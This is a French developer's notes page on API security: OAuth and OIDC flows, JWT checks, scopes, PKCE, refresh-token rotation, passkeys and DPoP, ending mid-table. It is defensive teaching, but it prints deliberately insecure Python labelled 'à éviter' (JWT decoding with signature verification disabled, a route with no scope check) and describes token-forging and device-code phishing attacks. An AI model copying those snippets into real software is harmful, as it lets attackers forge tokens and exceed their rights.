# Sécurité

!!! warning "Avertissement"
    Ces notes sont des pense-bêtes personnels, pas une source de vérité. Elles reflètent ma compréhension et mes choix : leur contenu reste subjectif, malgré les citations et les références qu'il contient. Il peut être incomplet, simplifié, inexact ou dépassé. Vérifiez toujours dans la documentation officielle avant de l'appliquer. Ce contenu est fourni tel quel, sans aucune garantie : son utilisation se fait sous votre seule responsabilité.

!!! audience "Pour qui, pour quoi"
    - **Métiers** : développeur back-end, développeur front-end, QA, SRE, architecte
    - **Usages** : je prépare un entretien sur OAuth, les JWT ou l'OWASP API Top 10 ; je choisis le flux OAuth d'une appli mobile ou d'un batch nocturne ; j'écris les tests `401` et `403` d'une route, dont le cas « ada lit la commande de grace » ; je relis une MR qui configure CORS ou stocke des mots de passe

!!! abstract "Les échelles"
    Les pastilles de couleur sous les titres disent à quelle échelle une notion s'applique :

    - <span class="pill pill-scope pill-scope-code">Code</span> les classes, fonctions et modules d'un programme ;
    - <span class="pill pill-scope pill-scope-app">Application</span> un service ou une application et son découpage interne ;
    - <span class="pill pill-scope pill-scope-system">Système</span> plusieurs services qui communiquent par le réseau ;
    - <span class="pill pill-scope pill-scope-infra">Infrastructure</span> les serveurs, le réseau, les zones et les clusters, physiques ou virtuels ;
    - <span class="pill pill-scope pill-scope-enterprise">Entreprise</span> le système d'information entier et son organisation.

    Détail et mots ambigus : [carte des échelles](architecture.md#carte-des-echelles).

Cette page couvre la sécurité qu'on croise tous les jours en développant et en testant : qui a le droit de faire quoi (<span class="term" data-term="authentication">authentification</span>, <span class="term" data-term="authorization">autorisation</span>), comment c'est prouvé (OAuth, <span class="term" data-term="openid-connect">OpenID Connect</span>, <span class="term" data-term="token-oauth">jetons</span>), ce que change OAuth 2.1, ce qu'est Auth0, et les failles les plus courantes des API.

Les noms de domaines, d'applications et de comptes sont des exemples.

:material-swap-horizontal: Les outils cités dans cette page : lesquels se remplacent, lesquels se combinent ? Voir [Complémentaires ou concurrents](outils.md#complementaires-ou-concurrents).
{ .doc-ref }

## Vocabulaire

**Authentification** : vérifier **qui** je suis. « Tu es bien ada ? » Un mot de passe, une empreinte, un code.

**Autorisation** : vérifier **ce que** j'ai le droit de faire. « Ada peut-elle voir la commande 42 ? »

```
401 Unauthorized   je ne sais pas qui tu es            (authentification ratée)
403 Forbidden      je sais qui tu es, mais c'est non   (autorisation refusée)
```

**Jeton (token)** : une chaîne de caractères qui prouve une connexion ou un droit, envoyée à chaque requête au lieu du mot de passe.

**Fournisseur d'identité (IdP)** : le service qui gère les comptes et les connexions (Auth0, Okta, Keycloak, Entra ID). Les applications lui délèguent la connexion au lieu de stocker elles-mêmes les mots de passe.

**MFA (authentification multifacteur)** : un deuxième élément en plus du mot de passe : un code TOTP qui change toutes les 30 secondes, une notification sur le téléphone, une clé physique.

**Secret** : une donnée qui donne un accès et ne doit jamais être publique : mot de passe, clé d'API, `client_secret`, <span class="term" data-term="private-key">clé privée</span>.

**<span class="term" data-term="sli">SLI</span>** : l'indicateur que je mesure pour savoir si une mesure de sécurité tient. Exemple : le délai entre la publication d'une faille critique dans une de mes dépendances et son correctif en production.

**<span class="term" data-term="slo">SLO</span>** : l'objectif interne que l'équipe se fixe sur ce SLI. Exemple : 95 % des failles critiques corrigées en moins de 7 jours.

**<span class="term" data-term="sla">SLA</span>** : la promesse faite par contrat à un client, avec une pénalité si elle n'est pas tenue, toujours plus lâche que le SLO pour garder de la marge. Exemple : un contrat entreprise qui promet de corriger une faille critique en moins de 30 jours.

:material-book-open-variant: Doc de référence : [OWASP, Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) (consultée en novembre 2026)
{ .doc-ref }

## OAuth et OpenID Connect

<a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a>

### OAuth 2.0 : déléguer un accès
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

OAuth est un **protocole d'autorisation** : il permet à une application d'obtenir un accès limité à une ressource, sans jamais connaître le mot de passe de l'utilisateur.

Exemple de la vie courante : un outil de planning veut lire mon agenda Google. Je ne lui donne pas mon mot de passe Google. Je me connecte chez Google, j'accepte « lire l'agenda », et Google donne à l'outil un <span class="term" data-term="token-oauth">jeton</span> limité à ça.

!!! noob "As noob"
    C'est la clé de voiturier : je la donne au voiturier pour garer la voiture, elle démarre le moteur mais n'ouvre ni le coffre ni la boîte à gants, et je peux la reprendre quand je veux. Ma vraie clé, elle, ne quitte jamais ma poche. La phrase à retenir : **OAuth donne à une application une clé limitée, jamais mon mot de passe.**

Les quatre rôles :

| Rôle                       | Qui                                      | Exemple                         |
|----------------------------|------------------------------------------|---------------------------------|
| propriétaire de la ressource | l'utilisateur                          | ada                             |
| client                     | l'application qui veut l'accès           | le site web ou l'appli mobile   |
| serveur d'autorisation     | celui qui délivre les jetons             | Auth0                           |
| serveur de ressources      | l'API protégée                           | `orders-api`                    |

```mermaid
sequenceDiagram
  participant P as ada<br/>propriétaire
  participant C as Client<br/>site web
  participant AS as Serveur d'autorisation<br/>Auth0
  participant RS as Serveur de ressources<br/>orders-api
  C->>P: demande l'autorisation
  P-->>C: accord
  C->>AS: présente l'accord
  AS-->>C: jeton d'accès
  C->>RS: requête avec le jeton
  RS-->>C: ressource protégée
```

**Risques.** Déléguer un accès ne dit rien de l'étendue des droits : un client qui demande trop de scopes à l'écran de consentement les obtient, parce que l'utilisateur clique « Accepter » sans lire. Une adresse de retour mal vérifiée envoie le code ou le jeton chez un attaquant. Je limite les scopes autorisés par client et je compare l'adresse de retour exactement (voir [ce qui change avec OAuth 2.1](#ce-qui-change)).

:material-book-open-variant: Doc de référence : [RFC 6749, The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749) (2012) ; [oauth.net, OAuth 2.0](https://oauth.net/2/) (consultée en novembre 2026)
{ .doc-ref }

### OpenID Connect (OIDC) : savoir qui est connecté
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

OAuth dit « ce jeton peut lire les commandes », mais pas « qui est connecté ». **OIDC** (publié en 2014) ajoute cette couche d'identité au-dessus d'OAuth : en plus du <span class="term" data-term="access-token">jeton d'accès</span>, le client reçoit un **ID token** qui dit qui est l'utilisateur.

!!! noob "As noob"
    À l'hôtel, la carte de chambre ouvre ma porte mais ne dit pas mon nom : c'est le jeton d'accès, fait pour la serrure (l'API). La fiche d'accueil remise à la réception dit qui je suis : c'est l'ID token, fait pour l'application. La phrase à retenir : **l'access token ouvre des portes, l'ID token présente la personne.**

| Jeton          | Pour qui           | Sert à                                        |
|----------------|--------------------|-----------------------------------------------|
| access token   | l'API              | « ce porteur a le droit de lire les commandes » |
| ID token       | l'application cliente | « l'utilisateur connecté est ada, ada@example.com » |
| <span class="term" data-term="refresh-token">refresh token</span>  | l'application cliente | obtenir un nouvel access token sans redemander la connexion |

Erreur classique : envoyer l'ID token à l'API à la place de l'access token. L'ID token est fait pour le client, pas pour donner des droits sur une API.

:material-book-open-variant: Doc de référence : [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html) (2014)
{ .doc-ref }

### JWT : à quoi ressemble un jeton
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Beaucoup de jetons sont des **JWT** (JSON Web Token) : trois parties en base64, séparées par des points.

!!! noob "As noob"
    Un JWT, c'est une carte postale fermée par un cachet de cire : tout le monde peut lire ce qui est écrit, mais personne ne peut modifier le texte sans briser le cachet. L'API vérifie le cachet, pas le secret du contenu. La phrase à retenir : **un JWT est infalsifiable, pas confidentiel.**

```
eyJhbGciOiJSUzI1NiIsImtpZCI6ImsxIn0.eyJpc3MiOi4uLn0.Zm9vYmFy...
└──── en-tête ────────────────────┘ └─ contenu ──┘ └ signature ┘
```
Une fois décodé, le contenu :
```json
{
  "iss": "https://my-tenant.eu.auth0.com/",
  "sub": "auth0|64f1c2",
  "aud": "https://orders-api.example.com",
  "exp": 1792500000,
  "scope": "read:orders"
}
```

| Champ   | Sens                                               | À vérifier côté API                      |
|---------|----------------------------------------------------|------------------------------------------|
| `iss`   | qui a émis le jeton                                | c'est bien mon <span class="term" data-term="identity-provider">fournisseur d'identité</span>    |
| `sub`   | pour qui (l'identifiant de l'utilisateur)          |                                          |
| `aud`   | pour quelle API il est fait                        | c'est bien **mon** API                   |
| `exp`   | date d'expiration                                  | pas dépassée                             |
| `scope` | les droits accordés                                | contient le droit demandé par la route   |

Deux choses à retenir :
- un JWT est **signé, pas chiffré** : n'importe qui peut lire son contenu (jwt.io le décode). Jamais de donnée sensible dedans ;
- l'API vérifie la **signature** avec la <span class="term" data-term="public-key">clé publique</span> du fournisseur, publiée à une adresse standard (`/.well-known/jwks.json`). Le champ `kid` de l'en-tête dit quelle clé utiliser.

L'erreur classique : lire le contenu du jeton avec une fonction qui ne vérifie pas la signature, souvent copiée d'un script de débogage. Un attaquant fabrique alors à la main un jeton avec `"scope": "admin"`, et l'API le croit. Fixer la liste des algorithmes acceptés bloque aussi un jeton qui annonce `"alg": "none"`.

```python
# À éviter : décode sans vérifier la signature, n'importe qui peut forger un jeton
claims = jwt.decode(token, options={"verify_signature": False})

# Bien : signature, algorithme, émetteur, audience et expiration vérifiés (PyJWT)
signing_key = jwks_client.get_signing_key_from_jwt(token)
claims = jwt.decode(
    token,
    signing_key.key,
    algorithms=["RS256"],
    audience="https://orders-api.example.com",
    issuer="https://my-tenant.eu.auth0.com/",
)
```

**Risques.** Un JWT reste valable jusqu'à son `exp`, même si le compte est désactivé entre-temps : l'API le vérifie seule, sans demander au fournisseur. Je garde des access tokens courts (quelques minutes) et, pour les actions sensibles comme un remboursement, je vérifie l'état du compte en plus du jeton.

:material-book-open-variant: Doc de référence : [RFC 7519, JSON Web Token](https://www.rfc-editor.org/rfc/rfc7519) (2015) ; [RFC 8725, JWT Best Current Practices](https://www.rfc-editor.org/rfc/rfc8725) (2020)
{ .doc-ref }

### Bearer token : le jeton « au porteur »
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Aujourd'hui, la plupart des API reçoivent le jeton comme ceci :
```
GET /orders/42
Authorization: Bearer eyJhbGciOi...
```
« Bearer » veut dire « porteur » : **celui qui a le jeton peut s'en servir**, comme un billet de banque. Si le jeton fuit (dans un log, un proxy, une extension de navigateur), le voleur peut l'utiliser jusqu'à son <span class="term" data-term="token-expiration">expiration</span>. C'est précisément ce que <span class="term" data-term="dpop">DPoP</span> corrige, voir plus bas.

:material-book-open-variant: Doc de référence : [RFC 6750, Bearer Token Usage](https://www.rfc-editor.org/rfc/rfc6750) (2012)
{ .doc-ref }

### Scope
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Mon outil de statistiques doit lire les commandes, mais n'a aucune raison de pouvoir les modifier. Le **scope** règle ça : c'est un droit précis, demandé par le client et accordé dans le jeton, comme `read:orders` ou `write:orders`. Principe du **moindre privilège** : ne demander que ce dont on a besoin. L'outil de statistiques demande donc seulement `read:orders`, et si son jeton fuit, personne ne peut modifier une commande avec.

Côté API, chaque route vérifie le scope qu'elle exige, pas seulement que le jeton est valide :

```python
# À éviter : seul le jeton est vérifié, le jeton read:orders de l'outil de statistiques peut annuler une commande
@app.post("/orders/{order_id}/cancel")
def cancel_order(order_id: int, claims: dict = Depends(valid_token)):
    return orders.cancel(order_id)

# Bien : la route exige write:orders, sinon 403
@app.post("/orders/{order_id}/cancel")
def cancel_order(order_id: int, claims: dict = Depends(require_scope("write:orders"))):
    return orders.cancel(order_id)
```

**Risques.** Des scopes trop larges, comme un seul `admin` accordé à tous les outils internes, annulent le moindre privilège : le jeton du plus petit script peut tout faire. Des scopes trop fins deviennent impossibles à suivre, et chacun finit par tout demander pour être tranquille. Je définis les scopes par ressource et par action (`read:orders`, `write:orders`), et je revois ceux qui ne servent jamais.

:material-book-open-variant: Doc de référence : [RFC 6749, Access Token Scope](https://www.rfc-editor.org/rfc/rfc6749#section-3.3) (2012)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | l'application passe par un fournisseur d'identité, mais chaque API vérifie le jeton à sa façon, parfois sans `aud` ni `iss` |
    | N2 | une bibliothèque partagée vérifie signature, algorithme, `iss`, `aud`, `exp` et scope sur chaque API, et chaque route déclare le scope qu'elle exige |
    | N3 | une route sans scope déclaré refuse seule tout appel, et les tests de refus (jeton expiré, mauvaise audience, signature modifiée) tournent à chaque MR |
    | N4 | l'équipe suit les `401` et `403` par client et par route, repère les scopes accordés mais jamais utilisés, et réduit les droits d'après ces chiffres |

    **Je mesure** : la part des routes couvertes par un test de refus, comptée dans le dépôt de tests ; le nombre de scopes accordés à chaque client comparé à ceux qu'il utilise, lu dans les journaux du fournisseur d'identité.

## Les flux OAuth

<a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a>

Un **flux** (grant) est la façon dont le client obtient son jeton. Le bon flux dépend du type de client : ada qui se connecte sur son téléphone n'obtient pas son jeton comme un batch qui tourne seul la nuit.

### Authorization Code avec PKCE : une personne se connecte
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Le flux pour toute application où un utilisateur se connecte : site web, application mobile, application dans le navigateur (<span class="term" data-term="spa">SPA</span>), outil en ligne de commande.

```mermaid
sequenceDiagram
  autonumber
  actor U as ada
  participant App as Appli
  participant AS as Auth0
  participant API as orders-api
  App->>App: code_verifier aléatoire à usage unique, code_challenge = SHA256(code_verifier)
  App->>AS: redirige ada vers /authorize avec le code_challenge
  U->>AS: se connecte, l'appli ne voit jamais son mot de passe
  AS->>App: redirige vers /callback avec un code temporaire
  App->>AS: POST /oauth/token avec le code et le code_verifier
  AS->>AS: SHA256(code_verifier) égale le code_challenge de l'étape 2 ?
  AS-->>App: access token, ID token
  App->>API: GET /orders, Authorization Bearer access token
```

**PKCE** (« pixie », Proof Key for Code Exchange) : si quelqu'un intercepte le code de l'étape 4 (une autre appli sur le téléphone qui écoute la même <span class="term" data-term="redirect-uri">adresse de retour</span>), il ne peut rien en faire : il n'a pas le `code_verifier`, qui n'a jamais circulé avant l'étape 5.

!!! noob "As noob"
    Au vestiaire, on me donne un ticket pour récupérer mon manteau (le code). Avec PKCE, je dépose en plus l'empreinte d'un mot secret que je garde pour moi, et au retour il faut le ticket **et** le mot secret. Quelqu'un qui ramasse mon ticket repart sans manteau. La phrase à retenir : **un code intercepté ne sert à rien sans le secret resté dans l'application.**

La requête de l'étape 2 :
```
https://my-tenant.eu.auth0.com/authorize
  ?response_type=code
  &client_id=abc123
  &redirect_uri=https://app.example.com/callback
  &scope=openid profile read:orders
  &audience=https://orders-api.example.com
  &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
  &code_challenge_method=S256
  &state=xyz789
```
`state` est une valeur aléatoire que l'appli vérifie au retour, pour s'assurer que la réponse correspond bien à sa propre demande.

**Risques.** PKCE ne sert à rien si le serveur accepte encore la méthode `plain`, où le `code_challenge` est le `code_verifier` lui-même : je n'accepte que `S256`. Oublier de vérifier `state` au retour laisse passer une réponse qui ne correspond à aucune demande de l'application, ce qui permet de connecter la victime au compte de l'attaquant.

:material-book-open-variant: Doc de référence : [RFC 7636, PKCE](https://www.rfc-editor.org/rfc/rfc7636) (2015) ; [RFC 6749, Authorization Code Grant](https://www.rfc-editor.org/rfc/rfc6749#section-4.1) (2012)
{ .doc-ref }

### Client Credentials : un service parle à un service
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Ici, personne ne se connecte : c'est un service qui a besoin d'un jeton pour lui-même, et il s'authentifie avec ses propres identifiants (`client_id` et `client_secret`). Cas typiques : un batch nocturne, un service qui en appelle un autre, des tests automatisés qui appellent une API.

!!! noob "As noob"
    C'est le badge d'un livreur attitré : personne ne se présente à l'accueil pour lui, il montre son propre badge et n'entre que là où ses livraisons l'autorisent. Si le badge est copié, n'importe qui entre à sa place : le `client_secret` se garde comme un mot de passe. La phrase à retenir : **Client Credentials, c'est un service qui prouve sa propre identité, sans personne derrière.**

```
$ curl -s https://my-tenant.eu.auth0.com/oauth/token \
    -H 'Content-Type: application/json' \
    -d '{
      "grant_type": "client_credentials",
      "client_id": "svc-reporting",
      "client_secret": "(depuis le gestionnaire de secrets)",
      "audience": "https://orders-api.example.com"
    }'
{"access_token": "eyJ...", "expires_in": 86400, "token_type": "Bearer"}
```

**Risques.** Le `client_secret` est un secret long : copié dans un fichier de configuration ou partagé entre plusieurs services, il donne leurs droits à qui le trouve, sans date de fin. Je le garde dans un gestionnaire de secrets, un par service, je le fais tourner, et une identité de charge de travail le remplace quand la plateforme le permet (voir [Lien avec Client Credentials](#lien-avec-client-credentials)). Demander un nouveau jeton à chaque appel épuise aussi les quotas du fournisseur : je le réutilise jusqu'à expiration.

:material-book-open-variant: Doc de référence : [RFC 6749, Client Credentials Grant](https://www.rfc-editor.org/rfc/rfc6749#section-4.4) (2012)
{ .doc-ref }

### Refresh Token : rester connecté
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

L'access token dure peu (de quelques minutes à quelques heures). Le refresh token permet d'en obtenir un nouveau sans redemander la connexion. Bonne pratique : la **rotation**, chaque refresh token ne sert qu'une fois et est remplacé par un nouveau. Si un ancien est réutilisé, c'est le signe d'un vol, et le fournisseur <span class="term" data-term="token-revocation">révoque</span> toute la famille de jetons.

!!! noob "As noob"
    Le refresh token est un ticket à usage unique pour obtenir un nouveau badge du jour, et chaque passage au guichet me rend un nouveau ticket. Si un ticket déjà utilisé se présente, le guichet sait qu'il a été copié et annule toute la série, le mien compris. La phrase à retenir : **un ticket réutilisé trahit le vol, et le fournisseur coupe tout.**

```mermaid
sequenceDiagram
  participant App as Appli
  participant AS as Auth0
  actor V as Voleur
  App->>AS: refresh token RT1
  AS-->>App: nouvel access token et RT2, RT1 invalidé
  Note over V: a copié RT1 plus tôt
  V->>AS: refresh token RT1
  AS->>AS: RT1 déjà utilisé, vol probable
  AS-->>V: refus
  AS->>AS: révoque toute la famille, RT2 compris
  App->>AS: refresh token RT2
  AS-->>App: refus, ada doit se reconnecter
```

**Risques.** La rotation a un effet de bord : deux onglets ou deux requêtes parallèles qui rafraîchissent avec le même refresh token déclenchent la détection de vol, et l'utilisateur est déconnecté sans raison. Je centralise le rafraîchissement dans le client, ou j'utilise le délai de grâce que proposent certains fournisseurs (à vérifier). Et un refresh token rangé dans le `localStorage` d'une SPA est lisible par tout script injecté par XSS.

:material-book-open-variant: Doc de référence : [RFC 9700, Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700) (2025)
{ .doc-ref }

### Device Authorization : un appareil sans clavier
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Ma télé, ma console ou un outil en ligne de commande sur un serveur doit se connecter, mais il n'a pas de navigateur, ou taper un mot de passe avec une télécommande est pénible. L'appareil affiche donc un code, et je le saisis sur mon téléphone, où je me connecte normalement.
```
Rendez-vous sur https://example.com/activate et entrez le code : WDJB-MJHT
```

**Risques.** Le code affiché peut servir à quelqu'un d'autre : un attaquant lance le flux, envoie le code à sa victime dans un faux message « activez votre compte », et récupère le jeton quand elle se connecte. Je garde des codes qui expirent vite, la page d'activation dit clairement quel appareil demande l'accès, et je réserve ce flux aux appareils sans navigateur.

:material-book-open-variant: Doc de référence : [RFC 8628, OAuth 2.0 Device Authorization Grant](https://www.rfc-editor.org/rfc/rfc8628) (2019)
{ .doc-ref }

### Quel flux pour quel client

| Client | Flux |
|---|---|
| j'ai un site web avec son propre serveur, comme une boutique en ligne où ada se connecte pour suivre ses commandes | Authorization Code + PKCE |
| mon application tourne entièrement dans le navigateur (SPA), sans serveur à moi pour garder un secret, comme un tableau de bord en React | Authorization Code + PKCE |
| mon application est installée sur le téléphone de l'utilisateur, comme l'appli mobile de la même boutique | Authorization Code + PKCE |
| personne ne se connecte : un service en appelle un autre, un batch tourne la nuit, ou mes tests automatisés appellent l'API | <span class="term" data-term="client-credentials">Client Credentials</span> |
| l'appareil n'a ni clavier pratique ni navigateur, comme une télé ou un outil en ligne de commande sur un serveur | Device Authorization |
| mon application affiche son propre formulaire, demande le mot de passe de l'utilisateur et l'envoie elle-même au fournisseur | **à ne plus faire** (voir OAuth 2.1) |

:material-book-open-variant: Doc de référence : [oauth.net, OAuth Grant Types](https://oauth.net/2/grant-types/) (consultée en novembre 2026)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | chaque application a son flux, choisi au moment de la créer, parfois encore Implicit ou Password |
    | N2 | la grille « quel flux pour quel client » s'applique à chaque nouvelle application, et les jetons machine sont mis en cache jusqu'à expiration |
    | N3 | le fournisseur d'identité refuse les flux interdits par configuration, et la rotation des refresh tokens révoque seule une famille de jetons réutilisée |
    | N4 | l'équipe suit les jetons émis par flux, les réutilisations de refresh token détectées et les demandes de jetons machine par jour, et ajuste durées de vie et quotas d'après ces chiffres |

    **Je mesure** : le nombre d'applications encore en flux Implicit ou Password, lu dans la console du fournisseur ; le nombre de réutilisations de refresh token détectées par mois, lu dans ses journaux.

## OAuth 2.1

<a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a>

### Ce que c'est
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

OAuth 2.1 n'invente pas de nouveau protocole. C'est OAuth 2.0 **nettoyé** : il regroupe en un seul texte les bonnes pratiques de sécurité accumulées depuis 2012, et retire ce qui s'est révélé dangereux.

Statut : c'est encore un **brouillon** de l'IETF (version 16, septembre 2026), pas une norme publiée. Mais les grands fournisseurs, dont Auth0, Okta et Microsoft, en appliquent déjà les règles, et le protocole <span class="term" data-term="mcp">MCP</span> (les connecteurs des assistants IA) l'exige.

*Okta : concurrent de Auth0, Keycloak*
{ .tool-rel }


### Ce qui change

| Changement                                         | Avant (OAuth 2.0)                                          | Avec OAuth 2.1                                  |
|----------------------------------------------------|------------------------------------------------------------|-------------------------------------------------|
| **PKCE obligatoire**                               | recommandé pour les applis mobiles seulement               | obligatoire pour **tous** les clients qui utilisent Authorization Code |
| **flux Implicit supprimé** <span class="pill pill-status pill-status-obsolete" title="Déconseillé par la RFC 9700 (janvier 2025), retiré d'OAuth 2.1 : remplacé par Authorization Code + PKCE">Obsolète · 11/2026</span>                         | une <span class="term" data-term="spa">SPA</span> recevait le jeton directement dans l'URL (`#access_token=...`) | supprimé : le jeton dans l'URL fuit dans l'historique, les logs, le Referer. Les SPA utilisent Authorization Code + <span class="term" data-term="pkce">PKCE</span> |
| **flux Password supprimé** <span class="pill pill-status pill-status-obsolete" title="Interdit par la RFC 9700 (janvier 2025), retiré d'OAuth 2.1 : remplacé par Authorization Code + PKCE">Obsolète · 11/2026</span>                         | l'appli demandait le mot de passe dans son formulaire et l'envoyait elle-même | supprimé : l'appli ne doit jamais voir le mot de passe. La connexion se fait chez le fournisseur d'identité |
| **adresse de retour exacte**                       | certains serveurs acceptaient des jokers (`https://*.example.com/*`) | comparaison **exacte** de la `redirect_uri` déclarée |
| **pas de jeton dans l'URL**                        | `GET /orders?access_token=eyJ...` toléré                   | interdit, uniquement dans l'en-tête `Authorization` |
| **refresh tokens des clients publics**             | réutilisables indéfiniment                                 | à usage unique (rotation) ou liés à une clé (DPoP) |

« Client public » : une application qui ne peut pas garder un <span class="term" data-term="secret">secret</span>, parce que son code est chez l'utilisateur (SPA, appli mobile, CLI). Par opposition au « client confidentiel », un back-end qui garde son `client_secret` sur un serveur.

:material-book-open-variant: Doc de référence : [IETF, The OAuth 2.1 Authorization Framework](https://datatracker.ietf.org/doc/draft-ietf-oauth-v2-1/) (brouillon, version 16, septembre 2026) ; [oauth.net, OAuth 2.1](https://oauth.net/2.1/) (consultée en novembre 2026)
{ .doc-ref }

### Idée reçue : « avec OAuth 2.1 et DPoP, il n'y a plus de mots de passe »
Pas tout à fait. Ce qui disparaît, c'est le **flux Password** : l'application ne reçoit plus jamais le mot de passe de l'utilisateur. Mais l'utilisateur peut toujours se connecter avec un mot de passe, **sur la page du fournisseur d'identité**. Se passer complètement de mot de passe, c'est autre chose : les **passkeys** (WebAuthn), une connexion par empreinte ou par clé physique, que le fournisseur d'identité peut proposer en plus. DPoP, lui, ne concerne pas la connexion de l'utilisateur, mais la protection du jeton une fois obtenu.

Une **<span class="term" data-term="passkey">passkey</span>** est une paire de clés créée par l'appareil (téléphone, ordinateur, clé physique) pour **un seul site** : la clé privée reste sur l'appareil, le site ne garde que la clé publique. **WebAuthn** (norme du W3C, première version en 2019) est l'API du navigateur qui fait ce dialogue :
```
inscription : l'appareil crée une paire de clés pour example.com et envoie la clé publique au site
connexion   :
1. le site envoie un défi (challenge) : une valeur aléatoire à usage unique
2. ada déverrouille l'appareil (empreinte, visage, code), qui signe le défi avec la clé privée
3. le site vérifie la signature avec la clé publique enregistrée : c'est bien ada
```
Rien de réutilisable ne circule, et la clé est liée au domaine : un faux site `examp1e.com` ne peut pas obtenir de signature valable pour `example.com`, ce qui rend l'hameçonnage inopérant.

**Risques.** Une passkey ne protège que si la récupération du compte est aussi solide : si « j'ai perdu mon téléphone » se règle par un simple e-mail, l'attaquant passe par là. Je fais enregistrer au moins deux passkeys par compte, ou je prévois une récupération vérifiée, et je ne retire le mot de passe qu'une fois ce chemin testé.

:material-book-open-variant: Doc de référence : [W3C, Web Authentication Level 2](https://www.w3.org/TR/webauthn-2/) (2021)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | l'équipe connaît OAuth 2.1, mais les applications existantes gardent leurs anciens réglages |
    | N2 | une liste de contrôle OAuth 2.1 (PKCE partout, adresses de retour exactes, pas de jeton dans l'URL) est vérifiée à la création de chaque client |
    | N3 | le fournisseur applique seul ces règles à tous les clients par configuration, et l'API refuse un jeton passé dans l'URL |
    | N4 | l'équipe suit la part des clients conformes, en fait un objectif, et fixe une date de bascule pour les derniers d'après ces chiffres |

    **Je mesure** : la part des clients OAuth avec PKCE obligatoire et adresse de retour exacte, lue dans la configuration du fournisseur ; le nombre de requêtes reçues avec `access_token` dans l'URL, lu dans les logs de la passerelle.

## DPoP : un jeton qui ne sert qu'à son propriétaire

<a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a>

### Le problème
Un <span class="term" data-term="bearer-token">bearer token</span> volé marche pour le voleur. Exemple : un jeton qui apparaît par erreur dans un log de proxy est utilisable par toute personne qui lit ce log, jusqu'à son expiration.

### L'idée
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

**DPoP** (Demonstrating Proof of Possession, RFC 9449, publiée en 2023) lie le jeton à une **clé** que seul le client possède. À chaque requête, le client signe une petite **preuve** avec sa <span class="term" data-term="private-key">clé privée</span>. Un jeton volé sans la clé ne sert à rien.

!!! noob "As noob"
    Un bearer token est un billet de banque : qui le ramasse peut le dépenser. Avec DPoP, le jeton devient un chèque à mon nom qu'il faut signer à chaque utilisation, et moi seul ai le stylo (la clé privée). La phrase à retenir : **un jeton DPoP volé ne vaut rien sans la clé de son propriétaire.**

```mermaid
sequenceDiagram
  participant C as Client
  participant AS as Serveur d'autorisation
  participant API as orders-api
  C->>C: génère une paire de clés, la privée ne quitte jamais l'appareil
  C->>AS: POST /token, en-tête DPoP, preuve signée qui contient la clé publique
  AS->>AS: lie le jeton à l'empreinte de la clé, champ cnf.jkt
  AS-->>C: access token de type DPoP
  C->>API: GET /orders/42, le jeton et une nouvelle preuve signée
  API->>API: preuve signée par la clé liée au jeton ?
  API-->>C: 200 OK
  Note over API: jeton volé sans la clé privée, refusé
```

La requête change ainsi :
```
avant (bearer)                              avec DPoP
GET /orders/42                              GET /orders/42
Authorization: Bearer eyJhbGciOi...         Authorization: DPoP eyJhbGciOi...
                                            DPoP: eyJ0eXAiOiJkcG9wK2p3dCIs...
```

La preuve est un petit JWT signé, différent à chaque requête :
```json
{
  "htm": "GET",
  "htu": "https://orders-api.example.com/orders/42",
  "iat": 1792496000,
  "jti": "e1j3V_bKic8-LAEB",
  "ath": "fUHyO2r2Z3DZ53EsNrWBb0xWXoaNy59IiKCAqksmQEo"
}
```

| Champ | Sens                                                 | Ce que ça empêche                                 |
|-------|------------------------------------------------------|---------------------------------------------------|
| `htm` | la méthode HTTP de cette requête                     | réutiliser la preuve d'un `GET` pour un `DELETE`  |
| `htu` | l'URL de cette requête                               | réutiliser la preuve sur une autre route          |
| `iat` | l'heure de création                                  | réutiliser une vieille preuve                     |
| `jti` | un identifiant unique                                | rejouer exactement la même preuve                 |
| `ath` | l'empreinte du jeton d'accès                         | coller la preuve sur un autre jeton               |

**Risques.** DPoP ne protège pas d'un XSS : un script injecté dans la page peut faire signer des preuves par le navigateur sans jamais lire la clé, donc DPoP complète la protection contre le XSS sans la remplacer. Une horloge de client décalée fait refuser les preuves (`iat` jugé trop vieux ou dans le futur), comme sur le téléphone de Tom, réglé à la main avec dix minutes d'avance. Je tolère un petit écart d'horloge côté API (une minute, par exemple) et j'utilise le `nonce` fourni par le serveur quand il en propose un.

### Quand l'utiliser
| Situation | DPoP utile ? |
|---|---|
